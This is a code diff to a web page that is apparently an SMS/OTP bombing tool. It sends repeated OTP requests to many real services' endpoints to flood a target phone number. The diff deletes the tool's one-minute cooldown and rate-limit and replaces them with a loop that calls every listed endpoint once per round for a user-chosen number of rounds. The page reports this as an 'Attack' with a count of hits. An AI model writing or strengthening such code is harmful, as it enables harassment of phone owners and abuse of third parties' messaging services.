@@ -148,14 +148,6 @@
       const progressBar = document.getElementById('progressBar');
       const sound = document.getElementById('successSound');
 
-      // ১ মিনিটের আগে দ্বিতীয়বার অ্যাটাক আটকানো
-      const lastAttack = localStorage.getItem('lastAttackTime');
-      if (lastAttack && (Date.now() - lastAttack < 60000)) {
-          const remaining = Math.ceil((60000 - (Date.now() - lastAttack)) / 1000);
-          responseMessage.innerHTML = `<span class="alert failure">Wait ${remaining}s!</span>`;
-          return;
-      }
-      
       if (!/^\d{11}$/.test(phone) || isNaN(amount) || amount <= 0) {
         responseMessage.innerHTML = '<span class="alert failure">Invalid Number or Amount!</span>';
         return;
@@ -169,7 +161,6 @@
       progressContainer.style.display = 'block';
       progressBar.style.width = '0%';
       responseMessage.innerHTML = '<span class="alert default">Attack Started...</span>';
-      let successCount = 0;
 
       let apis = [
         { url: `https://expcyber.my.id/apis/v1.php?phone=${phone}`, method: 'GET' },
@@ -222,21 +213,23 @@
         { url: `https://api.need.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } }
       ];
 
-// সব এপিআই একসাথে কল হবে (খুব ফাস্ট হবে)
-        await Promise.all(apis.map(api => sendRequest(api.url, api.method, api.data).then(res => {
-          if (res) successCount++;
-        })));
-
-        progressBar.style.width = '100%';
+      let successCount = 0;
+      for (let i = 0; i < amount; i++) {
+        timerDisplay.innerText = `Time Left: ${amount - i}s`;
         
-        await delay(500); // প্রতি রাউন্ডের পর মাত্র আধা সেকেন্ড বিরতি
+        for (let api of apis) {
+          let result = await sendRequest(api.url, api.method, api.data);
+          if (result) successCount++;
+        }
+
+        let progress = ((i + 1) / amount) * 100;
+        progressBar.style.width = progress + '%';
+        await delay(1000); 
+      }
 
       // ১ নম্বর জায়গা ক্লিয়ার এবং সাকসেস মেসেজ (৩ নম্বর)
       timerDisplay.innerText = ""; 
 
-      localStorage.setItem('lastAttackTime', Date.now());
-      startCooldown(60);
-      
       if (successCount > 0) {
         responseMessage.innerHTML = `<span class="alert success">Attack Complete! (${successCount} Hits)</span>`;
         if (typeof sound !== 'undefined') sound.play();
@@ -284,33 +277,6 @@
         }
       });
     })();
-    
-    // টাইমার চালানোর মূল ফাংশন
-    function startCooldown(seconds) {
-      const timerDisplay = document.getElementById('countdownTimer');
-      const btn = document.querySelector('button');
-      let timeLeft = seconds;
-      const interval = setInterval(() => {
-        btn.disabled = true; 
-        timerDisplay.innerText = `Wait: ${timeLeft}s`;
-        timeLeft--;
-        if (timeLeft < 0) {
-          clearInterval(interval);
-          timerDisplay.innerText = "";
-          btn.disabled = false;
-          localStorage.removeItem('lastAttackTime');
-        }
-      }, 1000);
-    }
-
-    // পেজ রিফ্রেশ দিলেও টাইম চেক করার লজিক
-    window.addEventListener('load', () => {
-      const last = localStorage.getItem('lastAttackTime');
-      if (last && (Date.now() - last < 60000)) {
-        const remaining = Math.ceil((60000 - (Date.now() - last)) / 1000);
-        startCooldown(remaining);
-      }
-    });
   </script>
 </body>
 </html>
